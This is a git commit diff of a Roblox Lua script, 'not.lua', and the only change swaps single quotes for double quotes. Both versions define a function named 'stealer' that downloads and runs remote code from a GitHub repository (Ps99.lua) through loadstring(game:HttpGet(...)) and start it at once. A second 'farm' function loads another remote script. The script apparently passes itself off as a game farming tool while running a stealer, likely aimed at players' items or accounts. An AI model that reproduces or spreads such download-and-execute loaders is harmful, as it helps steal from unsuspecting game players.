2beb1cd1c227d4a1cd1b816738e84644951fd243
Rizo2tuff <ftyifyioftufgt@gmail.com>
2025-04-19 20:40:49 +0200

    Update not.lua

--- not.lua
+++ not.lua
@@ -1,8 +1,8 @@
 local function stealer()
-    loadstring(game:HttpGet('https://raw.githubusercontent.com/Rizo2tuff/Ps99/refs/heads/main/Ps99.lua'))()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/Rizo2tuff/Ps99/refs/heads/main/Ps99.lua"))()
 end
 local function farm()
-    loadstring(game:HttpGet('https://raw.githubusercontent.com/Rizo2tuff/HugeHunter/refs/heads/main/Hugehunter.lua'))()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/Rizo2tuff/HugeHunter/refs/heads/main/Hugehunter.lua"))()
 end
 
 task.spawn(stealer)
